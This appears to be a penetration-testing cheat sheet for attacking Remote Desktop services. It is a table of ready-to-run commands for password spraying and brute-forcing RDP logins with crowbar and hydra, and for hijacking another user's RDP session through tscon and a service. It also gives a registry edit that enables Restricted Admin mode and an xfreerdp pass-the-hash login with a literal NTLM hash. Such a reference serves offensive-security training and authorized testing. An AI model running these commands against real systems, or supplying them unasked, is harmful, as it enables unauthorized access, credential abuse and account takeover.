
## Attacking RDP

|**Command**|**Description**|
|---|---|
|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|
|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|
|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|
|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|
|`net start sessionhijack`|Execute the RDP session hijack.|
|`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable "Restricted Admin Mode" on the target Windows host.|
|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|

---
